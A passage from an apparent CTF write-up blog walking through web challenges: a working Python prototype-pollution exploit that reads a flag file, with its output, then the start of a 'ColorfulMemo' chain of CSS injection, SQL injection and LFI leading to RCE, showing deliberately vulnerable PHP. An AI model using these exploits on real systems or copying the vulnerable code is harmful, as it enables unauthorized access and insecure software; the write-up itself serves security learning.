24
25
26
27
28
29
30
31
32
33
34
</pre></td><td class="rouge-code"><pre> <span class="nx">app</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="dl">"</span><span class="s2">/api/users/:userid/:ws/:fname</span><span class="dl">"</span><span class="p">,</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
        <span class="kd">const</span> <span class="nx">userid</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">params</span><span class="p">.</span><span class="nx">userid</span> <span class="o">||</span> <span class="dl">""</span><span class="p">;</span>
        <span class="kd">const</span> <span class="nx">ws_name</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">params</span><span class="p">.</span><span class="nx">ws</span> <span class="o">||</span> <span class="dl">""</span><span class="p">;</span>
        <span class="kd">const</span> <span class="nx">f_name</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">params</span><span class="p">.</span><span class="nx">fname</span> <span class="o">||</span> <span class="dl">""</span><span class="p">;</span>
        <span class="kd">const</span> <span class="nx">token</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">token</span> <span class="o">||</span> <span class="dl">""</span><span class="p">;</span>

        <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">userid</span> <span class="o">||</span> <span class="o">!</span><span class="nx">token</span><span class="p">)</span>
            <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nf">status</span><span class="p">(</span><span class="mi">400</span><span class="p">).</span><span class="nf">json</span><span class="p">({</span><span class="na">ok</span><span class="p">:</span> <span class="kc">false</span><span class="p">,</span> <span class="na">err</span><span class="p">:</span> <span class="dl">"</span><span class="s2">Invalid userid or token</span><span class="dl">"</span><span class="p">});</span>
        <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nf">check_session</span><span class="p">(</span><span class="nx">userid</span><span class="p">,</span> <span class="nx">token</span><span class="p">))</span>
            <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nf">status</span><span class="p">(</span><span class="mi">403</span><span class="p">).</span><span class="nf">json</span><span class="p">({</span><span class="na">ok</span><span class="p">:</span> <span class="kc">false</span><span class="p">,</span> <span class="na">err</span><span class="p">:</span> <span class="dl">"</span><span class="s2">Failed to validate session</span><span class="dl">"</span><span class="p">});</span>

        <span class="kd">const</span> <span class="nx">user</span> <span class="o">=</span> <span class="nx">users</span><span class="p">[</span><span class="nx">userid</span><span class="p">];</span>
        <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">ws_name</span><span class="p">)</span>
            <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nf">status</span><span class="p">(</span><span class="mi">400</span><span class="p">).</span><span class="nf">json</span><span class="p">({</span><span class="na">ok</span><span class="p">:</span> <span class="kc">false</span><span class="p">,</span> <span class="na">err</span><span class="p">:</span> <span class="dl">"</span><span class="s2">Invalid workspace name</span><span class="dl">"</span><span class="p">});</span>
       
        <span class="kd">const</span> <span class="nx">workspace</span> <span class="o">=</span> <span class="nx">user</span><span class="p">.</span><span class="nx">workspaces</span><span class="p">[</span><span class="nx">ws_name</span><span class="p">];</span>
        <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">workspace</span><span class="p">)</span>
            <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nf">status</span><span class="p">(</span><span class="mi">404</span><span class="p">).</span><span class="nf">json</span><span class="p">({</span><span class="na">ok</span><span class="p">:</span> <span class="kc">false</span><span class="p">,</span> <span class="na">err</span><span class="p">:</span> <span class="dl">"</span><span class="s2">Failed to find workspace</span><span class="dl">"</span><span class="p">});</span>

        <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">f_name</span><span class="p">)</span>
            <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nf">status</span><span class="p">(</span><span class="mi">400</span><span class="p">).</span><span class="nf">json</span><span class="p">({</span><span class="na">ok</span><span class="p">:</span> <span class="kc">false</span><span class="p">,</span> <span class="na">err</span><span class="p">:</span> <span class="dl">"</span><span class="s2">Invalid file name</span><span class="dl">"</span><span class="p">});</span>

        <span class="kd">const</span> <span class="nx">f_path</span> <span class="o">=</span> <span class="nx">workspace</span><span class="p">[</span><span class="nx">f_name</span><span class="p">];</span>
        <span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="nx">f_path</span><span class="p">)</span>
        <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">f_path</span><span class="p">)</span>
            <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nf">status</span><span class="p">(</span><span class="mi">404</span><span class="p">).</span><span class="nf">json</span><span class="p">({</span><span class="na">ok</span><span class="p">:</span> <span class="kc">false</span><span class="p">,</span> <span class="na">err</span><span class="p">:</span> <span class="dl">"</span><span class="s2">Failed to find file</span><span class="dl">"</span><span class="p">});</span>
        
        <span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="s2">`user.base_dir : </span><span class="p">${</span><span class="nx">user</span><span class="p">.</span><span class="nx">base_dir</span><span class="p">}</span><span class="s2">`</span><span class="p">)</span>
        <span class="kd">const</span> <span class="nx">content</span> <span class="o">=</span> <span class="nf">read_b64_file</span><span class="p">(</span><span class="nx">path</span><span class="p">.</span><span class="nf">join</span><span class="p">(</span><span class="nx">user</span><span class="p">.</span><span class="nx">base_dir</span><span class="p">,</span> <span class="nx">f_path</span><span class="p">));</span>
        <span class="k">if</span><span class="p">(</span><span class="k">typeof</span> <span class="nx">content</span> <span class="o">==</span> <span class="dl">"</span><span class="s2">undefined</span><span class="dl">"</span><span class="p">)</span>
            <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nf">status</span><span class="p">(</span><span class="mi">500</span><span class="p">).</span><span class="nf">json</span><span class="p">({</span><span class="na">ok</span><span class="p">:</span> <span class="kc">false</span><span class="p">,</span> <span class="na">err</span><span class="p">:</span> <span class="dl">"</span><span class="s2">Internal server error</span><span class="dl">"</span><span class="p">});</span>

        <span class="nx">res</span><span class="p">.</span><span class="nf">status</span><span class="p">(</span><span class="mi">200</span><span class="p">).</span><span class="nf">json</span><span class="p">({</span><span class="na">ok</span><span class="p">:</span> <span class="kc">true</span><span class="p">,</span> <span class="na">file_content</span><span class="p">:</span> <span class="nx">content</span><span class="p">});</span>
    <span class="p">});</span>
</pre></td></tr></tbody></table></code></div></div>
<p>From now, we have to make the value of f_path to flag. But this f_path is in the object of workspace and also object workspace is in the object workspaces. Eventually we have to make the object of new user after we make the new token and object of workspace temporarily. So I got the flag after I pollutued the pass, owner, expire, base_dir, flag, workspace.</p>

<div class="language-python highlighter-rouge"><div class="code-header">
        <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
</pre></td><td class="rouge-code"><pre><span class="kn">from</span> <span class="n">itsdangerous</span> <span class="kn">import</span> <span class="n">base64_decode</span>
<span class="kn">import</span> <span class="n">requests</span>
<span class="kn">import</span> <span class="n">json</span>
<span class="kn">import</span> <span class="n">string</span> 
<span class="kn">import</span> <span class="n">random</span>

<span class="n">LENGTH</span> <span class="o">=</span> <span class="mi">4</span>
<span class="n">CHALL_URL</span> <span class="o">=</span> <span class="sh">"</span><span class="s">http://host3.dreamhack.games:19598</span><span class="sh">"</span>
<span class="c1">#CHALL_URL = "http://localhost:8888" # Locally
</span><span class="n">STRING_POOL</span> <span class="o">=</span> <span class="n">string</span><span class="p">.</span><span class="n">digits</span>
<span class="n">USERNAME</span> <span class="o">=</span> <span class="sh">""</span>
<span class="n">PASSWORD</span> <span class="o">=</span> <span class="sh">"</span><span class="s">aaaaaaaaaaa</span><span class="sh">"</span>
<span class="n">HEADER</span> <span class="o">=</span> <span class="p">{</span>
    <span class="sh">"</span><span class="s">Content-Type</span><span class="sh">"</span><span class="p">:</span><span class="sh">"</span><span class="s">application/json</span><span class="sh">"</span>
<span class="p">}</span>

<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="n">LENGTH</span><span class="p">):</span>
    <span class="n">USERNAME</span> <span class="o">+=</span> <span class="n">random</span><span class="p">.</span><span class="nf">choice</span><span class="p">(</span><span class="n">STRING_POOL</span><span class="p">)</span> 
<span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">'</span><span class="s">[+] USERNAME : </span><span class="si">{</span><span class="n">USERNAME</span><span class="si">}</span><span class="sh">'</span><span class="p">)</span>

<span class="c1"># Create the User Object
</span><span class="n">requests</span><span class="p">.</span><span class="nf">post</span><span class="p">(</span><span class="n">CHALL_URL</span> <span class="o">+</span> <span class="sh">'</span><span class="s">/api/users</span><span class="sh">'</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">HEADER</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">json</span><span class="p">.</span><span class="nf">dumps</span><span class="p">({</span><span class="sh">"</span><span class="s">userid</span><span class="sh">"</span><span class="p">:</span><span class="n">USERNAME</span><span class="p">,</span> <span class="sh">"</span><span class="s">pass</span><span class="sh">"</span><span class="p">:</span><span class="n">PASSWORD</span><span class="p">}))</span>

<span class="c1"># Login
</span><span class="n">token</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="nf">post</span><span class="p">(</span><span class="n">CHALL_URL</span> <span class="o">+</span> <span class="sh">'</span><span class="s">/api/users/auth</span><span class="sh">'</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">HEADER</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">json</span><span class="p">.</span><span class="nf">dumps</span><span class="p">({</span><span class="sh">"</span><span class="s">userid</span><span class="sh">"</span><span class="p">:</span><span class="n">USERNAME</span><span class="p">,</span> <span class="sh">"</span><span class="s">pass</span><span class="sh">"</span><span class="p">:</span><span class="n">PASSWORD</span><span class="p">})).</span><span class="nf">json</span><span class="p">()</span>
<span class="n">TOKEN</span> <span class="o">=</span> <span class="n">token</span><span class="p">[</span><span class="sh">'</span><span class="s">token</span><span class="sh">'</span><span class="p">]</span> 
<span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">[+] Token : </span><span class="si">{</span><span class="n">TOKEN</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>

<span class="c1"># Prototype Pollution * 6
</span><span class="n">requests</span><span class="p">.</span><span class="nf">post</span><span class="p">(</span><span class="n">CHALL_URL</span> <span class="o">+</span> <span class="sa">f</span><span class="sh">'</span><span class="s">/api/users/</span><span class="si">{</span><span class="n">USERNAME</span><span class="si">}</span><span class="s">/__proto__</span><span class="sh">'</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">HEADER</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">json</span><span class="p">.</span><span class="nf">dumps</span><span class="p">({</span><span class="sh">"</span><span class="s">token</span><span class="sh">"</span><span class="p">:</span><span class="n">TOKEN</span><span class="p">,</span> <span class="sh">"</span><span class="s">file_name</span><span class="sh">"</span><span class="p">:</span><span class="sh">"</span><span class="s">pass</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">file_path</span><span class="sh">"</span><span class="p">:</span><span class="sh">"</span><span class="s">pass</span><span class="sh">"</span><span class="p">}))</span>
<span class="n">requests</span><span class="p">.</span><span class="nf">post</span><span class="p">(</span><span class="n">CHALL_URL</span> <span class="o">+</span> <span class="sa">f</span><span class="sh">'</span><span class="s">/api/users/</span><span class="si">{</span><span class="n">USERNAME</span><span class="si">}</span><span class="s">/__proto__</span><span class="sh">'</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">HEADER</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">json</span><span class="p">.</span><span class="nf">dumps</span><span class="p">({</span><span class="sh">"</span><span class="s">token</span><span class="sh">"</span><span class="p">:</span><span class="n">TOKEN</span><span class="p">,</span> <span class="sh">"</span><span class="s">file_name</span><span class="sh">"</span><span class="p">:</span><span class="sh">"</span><span class="s">owner</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">file_path</span><span class="sh">"</span><span class="p">:</span><span class="sh">"</span><span class="s">pass</span><span class="sh">"</span><span class="p">}))</span>
<span class="n">requests</span><span class="p">.</span><span class="nf">post</span><span class="p">(</span><span class="n">CHALL_URL</span> <span class="o">+</span> <span class="sa">f</span><span class="sh">'</span><span class="s">/api/users/</span><span class="si">{</span><span class="n">USERNAME</span><span class="si">}</span><span class="s">/__proto__</span><span class="sh">'</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">HEADER</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">json</span><span class="p">.</span><span class="nf">dumps</span><span class="p">({</span><span class="sh">"</span><span class="s">token</span><span class="sh">"</span><span class="p">:</span><span class="n">TOKEN</span><span class="p">,</span> <span class="sh">"</span><span class="s">file_name</span><span class="sh">"</span><span class="p">:</span><span class="sh">"</span><span class="s">expire</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">file_path</span><span class="sh">"</span><span class="p">:</span><span class="sh">"</span><span class="s">100000000000</span><span class="sh">"</span><span class="p">}))</span>
<span class="n">requests</span><span class="p">.</span><span class="nf">post</span><span class="p">(</span><span class="n">CHALL_URL</span> <span class="o">+</span> <span class="sa">f</span><span class="sh">'</span><span class="s">/api/users/</span><span class="si">{</span><span class="n">USERNAME</span><span class="si">}</span><span class="s">/__proto__</span><span class="sh">'</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">HEADER</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">json</span><span class="p">.</span><span class="nf">dumps</span><span class="p">({</span><span class="sh">"</span><span class="s">token</span><span class="sh">"</span><span class="p">:</span><span class="n">TOKEN</span><span class="p">,</span> <span class="sh">"</span><span class="s">file_name</span><span class="sh">"</span><span class="p">:</span><span class="sh">"</span><span class="s">base_dir</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">file_path</span><span class="sh">"</span><span class="p">:</span><span class="sh">"</span><span class="s">/usr</span><span class="sh">"</span><span class="p">}))</span>
<span class="n">requests</span><span class="p">.</span><span class="nf">post</span><span class="p">(</span><span class="n">CHALL_URL</span> <span class="o">+</span> <span class="sa">f</span><span class="sh">'</span><span class="s">/api/users/</span><span class="si">{</span><span class="n">USERNAME</span><span class="si">}</span><span class="s">/__proto__</span><span class="sh">'</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">HEADER</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">json</span><span class="p">.</span><span class="nf">dumps</span><span class="p">({</span><span class="sh">"</span><span class="s">token</span><span class="sh">"</span><span class="p">:</span><span class="n">TOKEN</span><span class="p">,</span> <span class="sh">"</span><span class="s">file_name</span><span class="sh">"</span><span class="p">:</span><span class="sh">"</span><span class="s">src/app/flag</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">file_path</span><span class="sh">"</span><span class="p">:</span><span class="sh">"</span><span class="s">src/app/flag</span><span class="sh">"</span><span class="p">}))</span>
<span class="n">requests</span><span class="p">.</span><span class="nf">post</span><span class="p">(</span><span class="n">CHALL_URL</span> <span class="o">+</span> <span class="sa">f</span><span class="sh">'</span><span class="s">/api/users/</span><span class="si">{</span><span class="n">USERNAME</span><span class="si">}</span><span class="s">/__proto__</span><span class="sh">'</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">HEADER</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">json</span><span class="p">.</span><span class="nf">dumps</span><span class="p">({</span><span class="sh">"</span><span class="s">token</span><span class="sh">"</span><span class="p">:</span><span class="n">TOKEN</span><span class="p">,</span> <span class="sh">"</span><span class="s">file_name</span><span class="sh">"</span><span class="p">:</span><span class="sh">"</span><span class="s">workspaces</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">file_path</span><span class="sh">"</span><span class="p">:</span><span class="sh">"</span><span class="s">asdf</span><span class="sh">"</span><span class="p">}))</span>

<span class="c1"># Leak the flag
</span><span class="n">LEAK_DATA</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="n">CHALL_URL</span> <span class="o">+</span> <span class="sh">'</span><span class="s">/api/users/pass/__proto__/src%2fapp%2fflag</span><span class="sh">'</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">HEADER</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">json</span><span class="p">.</span><span class="nf">dumps</span><span class="p">({</span><span class="sh">"</span><span class="s">token</span><span class="sh">"</span><span class="p">:</span><span class="sh">"</span><span class="s">pass</span><span class="sh">"</span><span class="p">})).</span><span class="nf">json</span><span class="p">()</span>

<span class="k">try</span><span class="p">:</span>
    <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">[+] Leak Data : </span><span class="si">{</span><span class="nf">base64_decode</span><span class="p">(</span><span class="n">LEAK_DATA</span><span class="p">[</span><span class="sh">'</span><span class="s">file_content</span><span class="sh">'</span><span class="p">])</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
<span class="k">except</span><span class="p">:</span>
    <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">[+] Leak Data : </span><span class="si">{</span><span class="n">LEAK_DATA</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
</pre></td></tr></tbody></table></code></div></div>
<p>I wrote the exploit code as above.</p>

<div class="language-sh highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre></td><td class="rouge-code"><pre>❯ python3 nss-poc.py 
<span class="o">[</span>+] USERNAME : 4896
<span class="o">[</span>+] Token : b9ab24d6a79dda202bf365541d67998a2c5bf5ce
<span class="o">[</span>+] Leak Data : b<span class="s1">'GoN{4he_be4uty_0f_pr0t0typ3_p011uti0n}\n'</span>
</pre></td></tr></tbody></table></code></div></div>
<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>FLAG : GoN{4he_be4uty_0f_pr0t0typ3_p011uti0n}
</pre></td></tr></tbody></table></code></div></div>

<hr />
<h3 id="v---colorfulmemo-490-pts"><span class="me-2">(V) - ColorfulMemo [490 pts]</span><a href="#v---colorfulmemo-490-pts" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p>This is a challenge that triggers RCE via LFI vulnerability after uploading using SQL Injection.</p>

<div class="language-docker highlighter-rouge"><div class="code-header">
        <span data-label-text="Docker"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
</pre></td><td class="rouge-code"><pre><span class="k">FROM</span><span class="s"> mysql:8.0-debian</span>

<span class="k">ENV</span><span class="s"> MYSQL_RANDOM_ROOT_PASSWORD=yes</span>
<span class="k">ENV</span><span class="s"> MYSQL_USER=user</span>
<span class="k">ENV</span><span class="s"> MYSQL_PASSWORD=password</span>
<span class="k">ENV</span><span class="s"> MYSQL_DATABASE=colorfulmemo</span>
<span class="k">ENV</span><span class="s"> TZ=Asia/Seoul</span>
<span class="k">ENV</span><span class="s"> OPENSSL_CONF=/dev/null</span>

<span class="k">RUN </span><span class="nb">sed</span> <span class="nt">-i</span> <span class="s1">'s/deb.debian.org/mirror.kakao.com/g'</span> /etc/apt/sources.list 

<span class="k">RUN </span>apt-get update <span class="nt">-y</span> <span class="se">\
</span> <span class="o">&amp;&amp;</span> <span class="nv">DEBIAN_FRONTEND</span><span class="o">=</span>noninteractive <span class="se">\
</span>    apt-get <span class="nb">install</span> <span class="nt">--no-install-recommends</span> <span class="nt">-y</span> <span class="se">\
</span>        gcc wget bzip2 python3-pip python3-setuptools <span class="se">\
</span>        software-properties-common apache2 php php-mysqli <span class="se">\
</span>        chrpath libssl-dev libxft-dev <span class="se">\
</span>        libfreetype6 libfreetype6-dev <span class="se">\
</span>        libfontconfig1 libfontconfig1-dev <span class="se">\
</span> <span class="o">&amp;&amp;</span> <span class="nb">rm</span> <span class="nt">-rf</span> /var/lib/apt/lists/<span class="k">*</span> /var/www/html/<span class="k">*</span>

<span class="k">COPY</span><span class="s"> ./src/ /var/www/html/</span>
<span class="k">RUN </span><span class="nb">chmod</span> <span class="nt">-R</span> 755 /var/www/html

<span class="k">RUN </span>wget <span class="nt">-q</span> <span class="nt">-O</span> /root/phantomjs-2.1.1-linux-x86_64.tar.bz2 <span class="se">\
</span>    https://bitbucket.org/ariya/phantomjs/downloads/phantomjs-2.1.1-linux-x86_64.tar.bz2 <span class="se">\
</span> <span class="o">&amp;&amp;</span> <span class="nb">tar</span> <span class="nt">-C</span> /root/ <span class="nt">-jxf</span> /root/phantomjs-2.1.1-linux-x86_64.tar.bz2 <span class="se">\
</span> <span class="o">&amp;&amp;</span> <span class="nb">cp</span> /root/phantomjs-2.1.1-linux-x86_64/bin/phantomjs /bin/ <span class="se">\
</span> <span class="o">&amp;&amp;</span> <span class="nb">rm</span> <span class="nt">-rf</span> /root/phantomjs<span class="k">*</span>

<span class="k">RUN </span>pip3 <span class="nb">install</span> <span class="nt">--no-cache-dir</span> <span class="nv">selenium</span><span class="o">==</span>2.48.0

<span class="k">COPY</span><span class="s"> ./bot.py /bot.py</span>
<span class="k">RUN </span><span class="nb">chmod </span>755 /bot.py

<span class="c"># Config files</span>
<span class="k">COPY</span><span class="s"> mysql/config/ /etc/mysql/</span>

<span class="k">RUN </span><span class="nb">chown</span> <span class="nt">-R</span> www-data:www-data /var/lib/mysql /var/run/mysqld

<span class="k">COPY</span><span class="s"> ./init.sql /docker-entrypoint-initdb.d</span>

<span class="k">EXPOSE</span><span class="s"> 80</span>
<span class="k">EXPOSE</span><span class="s"> 3306</span>

<span class="k">COPY</span><span class="s"> ./run.sh /run.sh</span>
<span class="k">RUN </span><span class="nb">chmod </span>755 /run.sh

<span class="k">COPY</span><span class="s"> --chown=root:www-data ./flag /flag</span>
<span class="k">RUN </span><span class="nb">chmod </span>440 /flag <span class="o">&amp;&amp;</span> <span class="se">\
</span>    <span class="nb">mv</span> /flag /flag_<span class="si">$(</span><span class="nb">md5sum</span> /flag | <span class="nb">awk</span> <span class="s1">'{print $1}'</span><span class="si">)</span>

<span class="k">ENTRYPOINT</span><span class="s"> ["/run.sh"]</span>
</pre></td></tr></tbody></table></code></div></div>
<p>In the docker file, I could know that challenge use MySQL and Apache and location of flag is /flag_$(md5sum /flag | awk ‘{print $1}’).</p>

<div class="language-sh highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre></td><td class="rouge-code"><pre>~/Downloads/b05d57b0-db9a-4196-a9c0-8db4c0ff5361/src
❯ tree <span class="nt">-I</span> <span class="s2">"js|bootstrap"</span> 
<span class="nb">.</span>
├── check.php
├── header.php
├── include.php
├── index.php
├── list.php
├── main.php
├── read.php
├── submit.php
└── write.php

0 directories, 9 files
</pre></td></tr></tbody></table></code></div></div>
<p>Above code is back-end code. There is three vulnerabilities called CSS Injection to SSRF, SQL Injection to File upload, LFI to RCE.</p>

<div class="language-php highlighter-rouge"><div class="code-header">
        <span data-label-text="PHP"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre></td><td class="rouge-code"><pre><span class="nt">&lt;style&gt;</span>
    <span class="nc">.content</span><span class="p">{</span>
        <span class="nl">color</span><span class="p">:</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nv">$color</span> <span class="cp">?&gt;</span>
    <span class="p">}</span>
<span class="nt">&lt;/style&gt;</span>

<span class="c">&lt;!-- /var/www/html/read.php --&gt;</span>
</pre></td></tr></tbody></table></code></div></div>
<p>CSS Injection occurred in read.php. this is important point.</p>

<div class="language-php highlighter-rouge"><div class="code-header">
        <span data-label-text="PHP"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
</pre></td><td class="rouge-code"><pre><span class="cp">&lt;?php</span>
    <span class="nv">$path</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s2">"path"</span><span class="p">];</span>
    <span class="k">if</span><span class="p">(</span><span class="nv">$path</span> <span class="o">==</span> <span class="s2">""</span><span class="p">){</span>
        <span class="nv">$path</span> <span class="o">=</span> <span class="s2">"main"</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="nv">$path</span> <span class="o">=</span> <span class="s2">"./"</span><span class="mf">.</span><span class="nv">$path</span><span class="mf">.</span><span class="s2">".php"</span><span class="p">;</span>
<span class="cp">?&gt;</span>

<span class="nt">&lt;style&gt;</span>
<span class="nc">.body</span> <span class="p">{</span>
    <span class="nl">padding-top</span><span class="p">:</span><span class="m">5%</span><span class="p">;</span>
    <span class="nl">padding-left</span><span class="p">:</span><span class="m">5%</span><span class="p">;</span>
    <span class="nl">padding-right</span><span class="p">:</span><span class="m">5%</span><span class="p">;</span>
<span class="p">}</span>
<span class="nt">&lt;/style&gt;</span>

<span class="cp">&lt;!DOCTYPE html&gt;</span>
<span class="nt">&lt;html&gt;</span>
    <span class="nt">&lt;head&gt;</span>
        <span class="cp">&lt;?php</span> <span class="k">include_once</span> <span class="s2">"./include.php"</span><span class="p">;</span> <span class="cp">?&gt;</span>
    <span class="nt">&lt;/head&gt;</span>
    <span class="nt">&lt;body&gt;</span>
        <span class="cp">&lt;?php</span> <span class="k">include_once</span> <span class="s2">"./header.php"</span><span class="p">;</span> <span class="cp">?&gt;</span>
        <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"body"</span><span class="nt">&gt;</span>
            <span class="cp">&lt;?php</span> <span class="k">include_once</span> <span class="nv">$path</span><span class="p">;</span> <span class="cp">?&gt;</span>
        <span class="nt">&lt;/div&gt;</span>
    <span class="nt">&lt;/body&gt;</span>
<span class="nt">&lt;/html&gt;</span>
<span class="c">&lt;!-- /var/www/html/index.php --&gt;</span>
</pre></td></tr></tbody></table></code></div></div>
<p>LFI occurred because it don’t check $path parameter in index.php.</p>

<div class="language-php highlighter-rouge"><div class="code-header">
        <span data-label-text="PHP"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
</pre></td><td class="rouge-code"><pre><span class="cp">&lt;?php</span>
<span class="k">if</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s2">"REMOTE_ADDR"</span><span class="p">]</span> <span class="o">==</span> <span class="s1">'127.0.0.1'</span> <span class="o">||</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s2">"REMOTE_ADDR"</span><span class="p">]</span> <span class="o">==</span> <span class="s1">'::1'</span><span class="p">){</span>
    <span class="nv">$id</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'id'</span><span class="p">];</span>
    <span class="nv">$mysqli</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">mysqli</span><span class="p">(</span><span class="s1">'localhost'</span><span class="p">,</span><span class="s1">'user'</span><span class="p">,</span><span class="s1">'password'</span><span class="p">,</span><span class="s1">'colorfulmemo'</span><span class="p">);</span>
    <span class="c1">// I believe admin</span>
    <span class="nv">$result</span> <span class="o">=</span> <span class="nv">$mysqli</span><span class="o">-&gt;</span><span class="nf">query</span><span class="p">(</span><span class="s1">'SELECT adminCheck FROM memo WHERE id = '</span><span class="mf">.</span><span class="nv">$id</span><span class="p">);</span>
    <span class="k">if</span><span class="p">(</span><span class="nv">$result</span><span class="p">){</span>
